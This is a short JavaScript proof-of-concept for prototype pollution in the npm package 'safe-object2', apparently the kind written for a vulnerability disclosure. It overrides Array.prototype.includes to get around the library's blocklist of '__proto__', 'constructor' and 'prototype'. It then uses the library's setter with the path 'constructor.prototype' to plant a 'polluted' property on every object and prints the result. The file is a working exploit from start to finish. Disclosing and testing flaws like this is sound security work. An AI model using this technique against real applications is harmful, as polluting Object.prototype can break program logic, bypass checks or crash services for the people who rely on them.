Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const safeObj2 = require('safe-object2');
const obj = safeObj2({});
console.log({}.polluted);
obj.setter([
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);